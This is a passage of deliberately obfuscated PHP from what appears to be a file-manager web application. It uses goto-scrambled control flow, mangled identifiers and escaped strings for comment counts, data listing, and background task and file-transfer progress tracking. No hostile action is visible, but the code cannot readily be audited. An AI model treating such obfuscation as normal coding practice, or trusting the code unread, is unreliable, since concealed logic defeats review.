$this->where($d™ä‚åÎ×Ú)->count(); goto Aß…×éİã†; Eº‘¦ëïáå: return $D¿÷õ™­æù; goto E°½ğÜÊ„; Aß…×éİã†: $bä‚‰™œé¨ = "\122\111\x47\x48\x54\40\112\117\111\116\x20{$this->tablePrefix}\143\157\x6d\x6d\145\156\164\137\160\x72\141\151\x73\x65\40\163\164\141\x72\x20\157\x6e\x20\143\157\155\155\145\x6e\164\x2e\x63\x6f\x6d\155\145\156\x74\111\x44\40\x3d\40\163\164\x61\162\x2e\143\x6f\155\155\145\156\164\x49\x44"; $e•á¦œ÷â = $this->alias($CŒ’Ş–êÂÆ[352])->where($d™ä‚åÎ×Ú)->join($bä‚‰™œé¨, $CŒ’Ş–êÂÆ[1724])->count(); $D¿÷õ™­æù = array($CŒ’Ş–êÂÆ[1725] => $aëÚ¥ç÷œ, $CŒ’Ş–êÂÆ[1726] => $e•á¦œ÷â); goto Eº‘¦ëïáå; E°½ğÜÊ„: } public function listData($a“ŒŒæ—±è) { $b˜¬ÔÅ’ÒÃ =& $_SERVER[æ§›¦ÌáØ]; if (isset($a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1727]])) { if ($a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1727]]) { $a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1728]] = array($b˜¬ÔÅ’ÒÃ[962], intval($a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1727]])); } unset($a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1727]]); } if (isset($a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1729]])) { if ($a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1729]]) { $a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1728]] = array($b˜¬ÔÅ’ÒÃ[959], intval($a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1729]])); } unset($a“ŒŒæ—±è[$b˜¬ÔÅ’ÒÃ[1729]]); } return $this->_listData($a“ŒŒæ—±è); } private function _listData($D¿ë’Âİ„é) { $AÓßî½æÂ­ =& $_SERVER[æ§›¦ÌáØ]; $D’ÍÛ‰ˆ¶‡ = $this->where($D¿ë’Âİ„é)->_makeOrder()->selectPage(100); $this->_listAppendParent($D’ÍÛ‰ˆ¶‡[$AÓßî½æÂ­[367]]); $this->_listAppendUser($D’ÍÛ‰ˆ¶‡[$AÓßî½æÂ­[367]]); $this->_listAppendMeta($D’ÍÛ‰ˆ¶‡[$AÓßî½æÂ­[367]]); return $D’ÍÛ‰ˆ¶‡; } private function _makeOrder() { $eªŒà»Š¶è =& $_SERVER[æ§›¦ÌáØ]; $Bõ¿×¬‚…– = array($eªŒà»Š¶è[1720], $eªŒà»Š¶è[1719], $eªŒà»Š¶è[194]); $aÜ‡‹‰¸ùİ = Input::get($eªŒà»Š¶è[435], $eªŒà»Š¶è[7], $eªŒà»Š¶è[416], $Bõ¿×¬‚…–); $cçØ›×Üå© = Input::get($eªŒà»Š¶è[436], $eªŒà»Š¶è[7], $eªŒà»Š¶è[1513], array($eªŒà»Š¶è[1730], $eªŒà»Š¶è[431])); $fÂ³“ò‰äÍ = $aÜ‡‹‰¸ùİ . $eªŒà»Š¶è[50] . $cçØ›×Üå©; return $this->order($fÂ³“ò‰äÍ); } private function _listAppendParent(&$f‘®ÕÛš¦) { goto bÔÜªèÜÖ; A¾ĞØÖ†˜µ: if (!$a–Û¡±¦‘) { return; } $CñÉò¸– º = $this->where(array($BÕªõÍ˜ Ç[1718] => array($BÕªõÍ˜ Ç[7], $a–Û¡±¦‘)))->select(); $CñÉò¸– º = array_to_keyvalue($CñÉò¸– º, $BÕªõÍ˜ Ç[1728]); goto F¡Ñ©ò‰¤à; F¡Ñ©ò‰¤à: foreach ($f‘®ÕÛš¦ as &$D¡“óñœë) { if (isset($CñÉò¸– º[$D¡“óñœë[$BÕªõÍ˜ Ç[1717]]])) { $D¡“óñœë[$BÕªõÍ˜ Ç[1731]] = $CñÉò¸– º[$D¡“óñœë[$BÕªõÍ˜ Ç[1717]]]; } } unset($D¡“óñœë); goto eŸÉš¯°¡; bÔÜªèÜÖ: $BÕªõÍ˜ Ç =& $_SERVER[æ§›¦ÌáØ]; $a–Û¡±¦‘ = array_unique(array_to_keyvalue($f‘®ÕÛš¦, $BÕªõÍ˜ Ç[33], $BÕªõÍ˜ Ç[1717])); $a–Û¡±¦‘ = array_remove_value($a–Û¡±¦‘, $BÕªõÍ˜ Ç[191]); goto A¾ĞØÖ†˜µ; eŸÉš¯°¡: } private function _listAppendUser(&$F¥‡ôÜ™Ù—) { goto a‰öøÔ©™Ş; cğÁƒ›‚Â: foreach ($F¥‡ôÜ™Ù— as &$c­¶¶ìëĞ) { $c­¶¶ìëĞ[$BÏÈù‘¥Æ×[575]] = $E×‰áˆÏ[$c­¶¶ìëĞ[$BÏÈù‘¥Æ×[1520]]]; if (isset($c­¶¶ìëĞ[$BÏÈù‘¥Æ×[1731]])) { $c­¶¶ìëĞ[$BÏÈù‘¥Æ×[1731]][$BÏÈù‘¥Æ×[575]] = $E×‰áˆÏ[$c­¶¶ìëĞ[$BÏÈù‘¥Æ×[1731]][$BÏÈù‘¥Æ×[1520]]]; } } unset($c­¶¶ìëĞ); goto fÆ„Æ¢‡ˆé; B¦­¦§©×: if (count($eŸù‰„ÅÂ) == 0) { return; } foreach ($F¥‡ôÜ™Ù— as $c­¶¶ìëĞ) { if (isset($c­¶¶ìëĞ[$BÏÈù‘¥Æ×[1731]])) { $eŸù‰„ÅÂ[] = $c­¶¶ìëĞ[$BÏÈù‘¥Æ×[1731]][$BÏÈù‘¥Æ×[1520]]; } } $E×‰áˆÏ = Model($BÏÈù‘¥Æ×[519])->userListInfo($eŸù‰„ÅÂ); goto cğÁƒ›‚Â; a‰öøÔ©™Ş: $BÏÈù‘¥Æ× =& $_SERVER[æ§›¦ÌáØ]; $eŸù‰„ÅÂ = array_unique(array_to_keyvalue($F¥‡ôÜ™Ù—, $BÏÈù‘¥Æ×[33], $BÏÈù‘¥Æ×[1520])); $eŸù‰„ÅÂ = array_remove_value($eŸù‰„ÅÂ, $BÏÈù‘¥Æ×[191]); goto B¦­¦§©×; fÆ„Æ¢‡ˆé: } private function _listAppendMeta(&$Aà§ìİö×­) { goto aéŠß™ÍÄ†; dİœÉ¦Şª: if (!$C ¼Áòëî‰) { return; } foreach ($Aà§ìİö×­ as $Aç‹Ô›Ó¯) { if (isset($Aç‹Ô›Ó¯[$EÉù¬ŒÒÅ¡[1731]])) { $C ¼Áòëî‰[] = $Aç‹Ô›Ó¯[$EÉù¬ŒÒÅ¡[1731]][$EÉù¬ŒÒÅ¡[1728]]; } } $CœÛÎ‘¿• = $this->metaList($C ¼Áòëî‰); goto Cî‹Õ„™¶ß; Cî‹Õ„™¶ß: if (!$CœÛÎ‘¿•) { return !1; } foreach ($Aà§ìİö×­ as &$Aç‹Ô›Ó¯) { $Aç‹Ô›Ó¯[$EÉù¬ŒÒÅ¡[445]] = $CœÛÎ‘¿•[$Aç‹Ô›Ó¯[$EÉù¬ŒÒÅ¡[1728]]]; if (isset($Aç‹Ô›Ó¯[$EÉù¬ŒÒÅ¡[1731]])) { $Aç‹Ô›Ó¯[$EÉù¬ŒÒÅ¡[1731]][$EÉù¬ŒÒÅ¡[445]] = $CœÛÎ‘¿•[$Aç‹Ô›Ó¯[$EÉù¬ŒÒÅ¡[1731]][$EÉù¬ŒÒÅ¡[1728]]]; } } unset($Aç‹Ô›Ó¯); goto E¸ïÌ†âÌ¦; aéŠß™ÍÄ†: $EÉù¬ŒÒÅ¡ =& $_SERVER[æ§›¦ÌáØ]; $C ¼Áòëî‰ = array_unique(array_to_keyvalue($Aà§ìİö×­, $EÉù¬ŒÒÅ¡[33], $EÉù¬ŒÒÅ¡[1728])); $C ¼Áòëî‰ = array_remove_value($C ¼Áòëî‰, $EÉù¬ŒÒÅ¡[191]); goto dİœÉ¦Şª; E¸ïÌ†âÌ¦: } private function metaList($a‰ôí¢Š„í) { goto DÕáÊæ‚Ë±; DÕáÊæ‚Ë±: $dõ¤ÖÀô† =& $_SERVER[æ§›¦ÌáØ]; if (!$a‰ôí¢Š„í) { return array(); } $a»™„Ü³ = array($dõ¤ÖÀô†[1728] => array($dõ¤ÖÀô†[7], $a‰ôí¢Š„í)); goto AˆÂÚäÎĞÁ; AˆÂÚäÎĞÁ: $C§‘±ÚÙ‚ã = Model($dõ¤ÖÀô†[1732])->where($a»™„Ü³)->select(); $C§‘±ÚÙ‚ã = array_to_keyvalue_group($C§‘±ÚÙ‚ã, $dõ¤ÖÀô†[1728]); foreach ($C§‘±ÚÙ‚ã as $AÉñ×‘îƒÅ => $C¼Æ»‹¡¹›) { $bãÇÙÒâ°í = array(); foreach ($C¼Æ»‹¡¹› as $EºŠ®ÌÈÚØ) { $bãÇÙÒâ°í[$EºŠ®ÌÈÚØ[$dõ¤ÖÀô†[93]]] = $EºŠ®ÌÈÚØ[$dõ¤ÖÀô†[372]]; } $C§‘±ÚÙ‚ã[$AÉñ×‘îƒÅ] = $bãÇÙÒâ°í; } goto E“Ó¹‚§; E“Ó¹‚§: return $C§‘±ÚÙ‚ã ? $C§‘±ÚÙ‚ã : array(); goto D×Âæ¨¬‡ë; D×Âæ¨¬‡ë: } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\x65\x5f\143\157\x6e\164\x65\156\x74\163"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\151\155\145", "\164\151\155\145", "\151\156\x73\x65\162\164", "\146\x75\156\143\164\x69\157\156")); } goto b„¹Ò¾Âˆ†; eÉí•‡©Šï: class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($EÒù¤‘çà¯, $CÃÁŠèĞÁù = '', $b†çŞæŠÓ = 0, $F‘óÙÕ¿Œ¬ = '') { goto BÄñ×‰«á; AŒˆ‘‘ÌÈÜ: $GLOBALS[$c…£ëâõå„[1526]] = 1; Hook::bind($c…£ëâõå„[1485], array($this, $c…£ëâõå„[1527])); Hook::bind($c…£ëâõå„[1528], array($this, $c…£ëâõå„[1529])); goto D‡Çì‰âÂ; BÄñ×‰«á: $c…£ëâõå„ =& $_SERVER[æ§›¦ÌáØ]; if (self::get($EÒù¤‘çà¯)) { return; } $this->task = array($c…£ëâõå„[393] => $EÒù¤‘çà¯, $c…£ëâõå„[1520] => USER_ID, $c…£ëâõå„[1423] => $F‘óÙÕ¿Œ¬, $c…£ëâõå„[29] => $CÃÁŠèĞÁù, $c…£ëâõå„[1013] => $c…£ëâõå„[33], $c…£ëâõå„[1011] => $b†çŞæŠÓ, $c…£ëâõå„[1026] => 0, $c…£ëâõå„[1521] => 0, $c…£ëâõå„[1522] => 0, $c…£ëâõå„[742] => timeFloat(), $c…£ëâõå„[741] => 0, $c…£ëâõå„[1523] => 0, $c…£ëâõå„[1524] => 0, $c…£ëâõå„[1525] => 0, $c…£ëâõå„[703] => $c…£ëâõå„[1483]); goto AŒˆ‘‘ÌÈÜ; D‡Çì‰âÂ: $this->startAfter(); Hook::trigger($c…£ëâõå„[1530], $this->task); $this->task[$c…£ëâõå„[1523]] = timeFloat(); goto e‰êå‘¸¨Å; e‰êå‘¸¨Å: } public function end() { goto f„ç‹»àÄ‘; dàœ¼¶šÕ’: $fŸ×ëæ£óí = timeFloat() - $this->task[$d‹Æ§ç‚šğ[742]]; self::log($d‹Æ§ç‚šğ[1531] . $this->task[$d‹Æ§ç‚šğ[393]] . $d‹Æ§ç‚šğ[1532] . $fŸ×ëæ£óí . $d‹Æ§ç‚šğ[1533]); Hook::unbind($d‹Æ§ç‚šğ[1485], array($this, $d‹Æ§ç‚šğ[1527])); goto d‡õµÑ¶¦¬; d‡õµÑ¶¦¬: Hook::unbind($d‹Æ§ç‚šğ[1528], array($this, $d‹Æ§ç‚šğ[1529])); $this->endAfter(); $this->task = !1; goto bÑæÎ”‘ˆ; f„ç‹»àÄ‘: $d‹Æ§ç‚šğ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->task) { return; } if ($this->task[$d‹Æ§ç‚šğ[1523]]) { self::valueSet($this->task[$d‹Æ§ç‚šğ[393]], !1); } goto dàœ¼¶šÕ’; bÑæÎ”‘ˆ: } public function update($CœƒéÁ«Ô = 0, $F† ƒÒÒŠ = false) { goto B¿‚ÅóæÄ; aˆ¬Œ¦‚â: $A³ÖÇ²ÏÙÑ = self::get($eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[393]]); $AºÄ ¹ù÷™ = $A³ÖÇ²ÏÙÑ[$BÜÜ õ†¬[703]]; if ($AºÄ ¹ù÷™ == self::STATYS_KILL) { $cÂÂãäÌì¢ = array($BÜÜ õ†¬[1534] => LNG($BÜÜ õ†¬[1535]), $BÜÜ õ†¬[1076] => !1); Cache::set($BÜÜ õ†¬[1536] . $this->task[$BÜÜ õ†¬[393]], $cÂÂãäÌì¢, 30); $this->onKill(); $this->end(); die; } else { if ($AºÄ ¹ù÷™ == self::STATYS_STOP) { $a¶ì¶³•¨ = 2; $A³ÖÇ²ÏÙÑ[$BÜÜ õ†¬[1524]] += $a¶ì¶³•¨; self::valueSet($eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[393]], $A³ÖÇ²ÏÙÑ); sleep($a¶ì¶³•¨); $this->update(); return; } } goto bîà…¤™„è; bîà…¤™„è: $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[703]] = $AºÄ ¹ù÷™ ? $AºÄ ¹ù÷™ : $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[703]]; $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1524]] = $A³ÖÇ²ÏÙÑ[$BÜÜ õ†¬[1524]] ? $A³ÖÇ²ÏÙÑ[$BÜÜ õ†¬[1524]] : 0; $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1523]] = timeFloat(); goto DÅáÖº‰É; B¿‚ÅóæÄ: $BÜÜ õ†¬ =& $_SERVER[æ§›¦ÌáØ]; $eñÔ™Ò¤ÄŠ =& $this->task; if (!$eñÔ™Ò¤ÄŠ) { return; } goto Dâ†ÄÑïÑ©; Dâ†ÄÑïÑ©: $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1026]] += $CœƒéÁ«Ô; $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[741]] = timeFloat(); if ($eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1011]]) { if ($eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1011]] < $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1026]]) { $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1011]] = $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1026]]; } $aÙ‰É·Ø³¸ = timeFloat() - $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[742]] - $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1524]]; $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1521]] = $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1026]] / $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1011]]; $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1522]] = $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1026]] / $aÙ‰É·Ø³¸; if ($eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1521]] > 0) { $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1525]] = $aÙ‰É·Ø³¸ * (1 - $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1521]]) / $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1521]]; } $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1525]] = $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1525]] <= 0 ? 0 : $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1525]]; } goto fÉ‘±œ®À; fÉ‘±œ®À: $this->updateAfter(); $Eèù‡‰Şá = 0.2; if (timeFloat() - $eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[1523]] < $Eèù‡‰Şá && !$F† ƒÒÒŠ) { return; } goto aˆ¬Œ¦‚â; DÅáÖº‰É: Hook::trigger($BÜÜ õ†¬[1537], $eñÔ™Ò¤ÄŠ); self::valueSet($eñÔ™Ò¤ÄŠ[$BÜÜ õ†¬[393]], $eñÔ™Ò¤ÄŠ); goto F†¬ø¯Ú‘È; F†¬ø¯Ú‘È: } public function onKillSet($F ¬ßó¡ÑĞ, $DÛé­ìÖ–“ = array()) { $this->onKillCall = array($F ¬ßó¡ÑĞ, $DÛé­ìÖ–“); } public function onKill() { $B©ªç˜¸° =& $_SERVER[æ§›¦ÌáØ]; self::log($B©ªç˜¸°[1531] . $this->task[$B©ªç˜¸°[393]] . $B©ªç˜¸°[1538]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Aêã¡‹èŒß) { $dŠÊ£–Û×ï =& $_SERVER[æ§›¦ÌáØ]; Cache::set($dŠÊ£–Û×ï[1536] . $this->task[$dŠÊ£–Û×ï[393]], $Aêã¡‹èŒß, 60); return $Aêã¡‹èŒß; } public static function get($AÊÓï ï) { $DƒÖË‹§’« =& $_SERVER[æ§›¦ÌáØ]; $b³Û½ŸÒİ« = self::valueGet($AÊÓï ï); if (is_array($b³Û½ŸÒİ«) && $b³Û½ŸÒİ«[$DƒÖË‹§’«[1539]]) { $F Ì‘š·¯ˆ = ActionApply($b³Û½ŸÒİ«[$DƒÖË‹§’«[1539]], array($b³Û½ŸÒİ«)); $b³Û½ŸÒİ« = is_array($F Ì‘š·¯ˆ) ? $F Ì‘š·¯ˆ : $b³Û½ŸÒİ«; } return $b³Û½ŸÒİ«; } public static function listData() { $E«§÷Úƒ©É = self::valueGet(); return array_sort_by($E«§÷Úƒ©É, $_SERVER[æ§›¦ÌáØ][742], !0); } public static function kill($E·ŞåáèÈé) { return self::changeStatus($E·ŞåáèÈé, self::STATYS_KILL); } public static function stop($eŠÓœ‹Ô—) { return self::changeStatus($eŠÓœ‹Ô—, self::STATYS_STOP); } public static function restart($c™­Áõ³¿¢) { return self::changeStatus($c™­Áõ³¿¢, self::STATYS_RUNNING); } public static function killAll() { $AÕŒí£§½ï =& $_SERVER[æ§›¦ÌáØ]; $fâŠ¥Œó¨ = self::listData(); foreach ($fâŠ¥Œó¨ as $B¤ñîÔ®»¯) { self::kill($B¤ñîÔ®»¯[$AÕŒí£§½ï[393]]); } sleep(2); foreach ($fâŠ¥Œó¨ as $B¤ñîÔ®»¯) { self::valueSet($B¤ñîÔ®»¯[$AÕŒí£§½ï[393]], !1); } } private static function changeStatus($bÜÅˆ‰Éà, $aÈ‚¿‘Î) { goto eÀ‹×Ìàäã; a‹Î±¸†‹: return !0; goto FÂ†•ãõ’…; eÀ‹×Ìàäã: $FÎ’‡…Ê„Ì =& $_SERVER[æ§›¦ÌáØ]; $Bš»´‘ˆÅª = self::valueGet($bÜÅˆ‰Éà); if (!$Bš»´‘ˆÅª) { return !1; } goto dÓßÚŠ—Á‡; dÓßÚŠ—Á‡: $Bš»´‘ˆÅª[$FÎ’‡…Ê„Ì[703]] = $aÈ‚¿‘Î; self::valueSet($bÜÅˆ‰Éà, $Bš»´‘ˆÅª); self::log($FÎ’‡…Ê„Ì[1540] . $Bš»´‘ˆÅª[$FÎ’‡…Ê„Ì[393]] . $FÎ’‡…Ê„Ì[1541] . $aÈ‚¿‘Î); goto a‹Î±¸†‹; FÂ†•ãõ’…: } public static function valueGet($DèÉó¾Æñ = false) { $c‰ØÑŞ­˜ù =& $_SERVER[æ§›¦ÌáØ]; if ($DèÉó¾Æñ) { $D‚ÄÈª‡İÍ = Model($c‰ØÑŞ­˜ù[425])->where(array($c‰ØÑŞ­˜ù[93] => $DèÉó¾Æñ, $c‰ØÑŞ­˜ù[29] => $c‰ØÑŞ­˜ù[1542]))->find(); return $D‚ÄÈª‡İÍ ? json_decode($D‚ÄÈª‡İÍ[$c‰ØÑŞ­˜ù[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($EçŠğÁ¯Óª = false) { goto Bš“Œ÷Î; Bš“Œ÷Î: $dº£î¹× =& $_SERVER[æ§›¦ÌáØ]; $e‰åµõùª = array($dº£î¹×[29] => $dº£î¹×[1542]); if ($EçŠğÁ¯Óª) { $e‰åµõùª[$dº£î¹×[1520]] = $EçŠğÁ¯Óª; } goto b½ÜØ˜¤; b½ÜØ˜¤: $f×–ĞöÕ„¼ = Model($dº£î¹×[425])->where($e‰åµõùª)->select(); $f×–ĞöÕ„¼ = $f×–ĞöÕ„¼ ? $f×–ĞöÕ„¼ : array(); foreach ($f×–ĞöÕ„¼ as $b¢ğæÍåƒ => $eƒ‚£÷çô‚) { $f×–ĞöÕ„¼[$b¢ğæÍåƒ] = json_decode($eƒ‚£÷çô‚[$dº£î¹×[372]], !0); } goto e‰×ù¶à—á; e‰×ù¶à—á: return $f×–ĞöÕ„¼; goto D…Õ”Ù¿ìï; D…Õ”Ù¿ìï: } public static function valueSet($E¢ÒãÇ½£¾, $C“ç“‹¾•¼) { goto BÕâÈÅ×Ê; A¼ç“ì–Ÿ÷: if (!$D½¸—¥­¨) { ob_start(); var_dump($C“ç“‹¾•¼); $dàŒ¯ÖÓÖ = ob_get_clean(); self::log($A™›ã¢‰ã[1543] . json_encode_force($dàŒ¯ÖÓÖ)); } if (!$E¢ÒãÇ½£¾ || !$C“ç“‹¾•¼[$A™›ã¢‰ã[393]]) { return !1; } $eâ‹ÁÊäŠ» = array($A™›ã¢‰ã[29] => $A™›ã¢‰ã[1542], $A™›ã¢‰ã[1520] => USER_ID, $A™›ã¢‰ã[93] => $E¢ÒãÇ½£¾, $A™›ã¢‰ã[372] => $D½¸—¥­¨); goto EåÖ†ƒà¸°; EåÖ†ƒà¸°: $BãˆˆÃ»ìÇ = $A™›ã¢‰ã[1544]; CacheLock::lock($BãˆˆÃ»ìÇ); Model($A™›ã¢‰ã[425])->add($eâ‹ÁÊäŠ», array(), !0); goto eğÅÆ³°Ìš; BÕâÈÅ×Ê: $A™›ã¢‰ã =& $_SERVER[æ§›¦ÌáØ]; if (!$C“ç“‹¾•¼) { return Model($A™›ã¢‰ã[425])->where(array($A™›ã¢‰ã[93] => $E¢ÒãÇ½£¾, $A™›ã¢‰ã[29] => $A™›ã¢‰ã[1542]))->delete(); } $D½¸—¥­¨ = json_encode($C“ç“‹¾•¼); goto A¼ç“ì–Ÿ÷; eğÅÆ³°Ìš: CacheLock::unlock($BãˆˆÃ»ìÇ); goto AÓ¡¨ßíÚ±; AÓ¡¨ßíÚ±: } public static function log($EŒó…ƒ‰¤Ş) { if (!GLOBAL_DEBUG) { return; } write_log($EŒó…ƒ‰¤Ş, $_SERVER[æ§›¦ÌáØ][1545]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto cğä›Ş½í; aÂÀÉÔì’ó: Hook::bind($a†¦õõºº¬[552], array($this, $a†¦õõºº¬[1554])); Hook::bind($a†¦õõºº¬[554], array($this, $a†¦õõºº¬[1554])); Hook::bind($a†¦õõºº¬[556], array($this, $a†¦õõºº¬[1554])); goto C†¾ó—ä‰Î; dÀó¯ïìñê: $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1570]] = 0; $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1571]] = 0; if (!$D›÷‡ÛŒ³‡[$a†¦õõºº¬[1423]]) { $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1423]] = LNG($a†¦õõºº¬[1572]); } goto a¨£Ú‘ê‡; DÙÌ†ì¦†Ú: $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1564]] = LNG($a†¦õõºº¬[1565]); $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1566]] = 0; $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1567]] = 0; goto a‰ôßâ…´î; C†Œ–Íñ–: Hook::bind($a†¦õõºº¬[579], array($this, $a†¦õõºº¬[1551])); Hook::bind($a†¦õõºº¬[580], array($this, $a†¦õõºº¬[1552])); Hook::bind($a†¦õõºº¬[582], array($this, $a†¦õõºº¬[1553])); goto aÔ„®·İ¯è; Bí×’²ÃÒ: Hook::bind($a†¦õõºº¬[1558], array($this, $a†¦õõºº¬[1559])); Hook::bind($a†¦õõºº¬[1560], array($this, $a†¦õõºº¬[1561])); Hook::bind($a†¦õõºº¬[1562], array($this, $a†¦õõºº¬[1563])); goto DÙÌ†ì¦†Ú; a‰ôßâ…´î: $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1013]] = $a†¦õõºº¬[33]; $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1568]] = $a†¦õõºº¬[33]; $D›÷‡ÛŒ³‡[$a†¦õõºº¬[1569]] = 0; goto dÀó¯ïìñê; cğä›Ş½í: $a†¦õõºº¬ =& $_SERVER[æ§›¦ÌáØ]; $D›÷‡ÛŒ³‡ =& $this->task; $this->sourceCopyFolder = !1; goto fÒ†ë®ôËÙ; fÒ†ë®ôËÙ: Hook::bind($a†¦õõºº¬[1546], array($this, $a†¦õõºº¬[1547])); Hook::bind($a†¦õõºº¬[1100], array($this, $a†¦õõºº¬[1548])); Hook::bind($a†¦õõºº¬[1549], array($this, $a†¦õõºº¬[1550])); goto C†Œ–Íñ–; C†¾ó—ä‰Î: Hook::bind($a†¦õõºº¬[1555], array($this, $a†¦õõºº¬[1556])); Hook::bind($a†¦õõºº¬[572], array($this, $a†¦õõºº¬[1557])); $this->sourceModelCopyFlag = !1; goto Bí×’²ÃÒ; aÔ„®·İ¯è: Hook::bind($a†¦õõºº¬[583], array($this, $a†¦õõºº¬[1553])); Hook::bind($a†¦õõºº¬[550], array($this, $a†¦õõºº¬[1554])); Hook::bind($a†¦õõºº¬[547], array($this, $a†¦õõºº¬[1554])); goto aÂÀÉÔì’ó; a¨£Ú‘ê‡: } protected function endAfter() { goto cçÒÕ·®È; fºšÕÓñÜ±: Hook::unbind($bªê²ç¯Ô[1558], array($this, $bªê²ç¯Ô[1559])); Hook::unbind($bªê²ç¯Ô[1560], array($this, $bªê²ç¯Ô[1561])); Hook::unbind($bªê²ç¯Ô[1562], array($this, $bªê²ç¯Ô[1563])); goto E±ø„ô©ê; cçÒÕ·®È: $bªê²ç¯Ô =& $_SERVER[æ§›¦ÌáØ]; Hook::unbind($bªê²ç¯Ô[1546], array($this, $bªê²ç¯Ô[1547])); Hook::unbind($bªê²ç¯Ô[1100], array($this, $bªê²ç¯Ô[1548])); goto b›½¤‡Ú õ; C§éæÆä½´: Hook::unbind($bªê²ç¯Ô[556], array($this, $bªê²ç¯Ô[1554])); Hook::unbind($bªê²ç¯Ô[1555], array($this, $bªê²ç¯Ô[1556])); Hook::unbind($bªê²ç¯Ô[572], array($this, $bªê²ç¯Ô[1557])); goto fºšÕÓñÜ±; b›½¤‡Ú õ: Hook::unbind($bªê²ç¯Ô[1549], array($this, $bªê²ç¯Ô[1550])); Hook::unbind($bªê²ç¯Ô[579], array($this, $bªê²ç¯Ô[1551])); Hook::unbind($bªê²ç¯Ô[580], array($this, $bªê²ç¯Ô[1552])); goto Bœ‚„æóŠç; Bœ‚„æóŠç: Hook::unbind($bªê²ç¯Ô[582], array($this, $bªê²ç¯Ô[1553])); Hook::unbind($bªê²ç¯Ô[583], array($this, $bªê²ç¯Ô[1553])); Hook::unbind($bªê²ç¯Ô[550], array($this, $bªê²ç¯Ô[1554])); goto E·°–„’šÚ; E·°–„’šÚ: Hook::unbind($bªê²ç¯Ô[547], array($this, $bªê²ç¯Ô[1554])); Hook::unbind($bªê²ç¯Ô[552], array($this, $bªê²ç¯Ô[1554])); Hook::unbind($bªê²ç¯Ô[554], array($this, $bªê²ç¯Ô[1554])); goto C§éæÆä½´; E±ø„ô©ê: } public function copyMoveStart($fáíÎ´İœœ, $eÖãŞ†ÉÔ, $d§ÑôŸÍª·, $dÁÏ—ŠÑ¶) { goto d™ŞÑ¾…Ò²; E›•‡ôÌÅï: $CİÚì†š´¹[$Fà£‚øØÔÆ[1574]] = KodIO::transferType($fáíÎ´İœœ, $d§ÑôŸÍª·); $this->update(); goto eàÃÇÎĞÏ; E¤öÒ¼Í: if (substr($eÖãŞ†ÉÔ, 0, strlen($bÛ¸È áÒÁ)) == $bÛ¸È áÒÁ) { return; } if (substr($dÁÏ—ŠÑ¶, 0, strlen($bÛ¸È áÒÁ)) == $bÛ¸È áÒÁ) { return; } $CİÚì†š´¹ =& $this->task; goto E›•‡ôÌÅï; d™ŞÑ¾…Ò²: $Fà£‚øØÔÆ =& $_SERVER[æ§›¦ÌáØ]; self::log($Fà£‚øØÔÆ[1573] . $eÖãŞ†ÉÔ . $Fà£‚øØÔÆ[67] . $dÁÏ—ŠÑ¶); $bÛ¸È áÒÁ = rtrim(TEMP_FILES, $Fà£‚øØÔÆ[8]); goto E¤öÒ¼Í; eàÃÇÎĞÏ: } public function updateAfter() { $a‡İ˜´Ö„å =& $_SERVER[æ§›¦ÌáØ]; $DŸ¨†ÒÌ÷ =& $this->task; if (!$DŸ¨†ÒÌ÷[$a‡İ˜´Ö„å[716]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($DŸ¨†ÒÌ÷[$a‡İ˜´Ö„å[1574]] == $a‡İ˜´Ö„å[1173]) { return; } 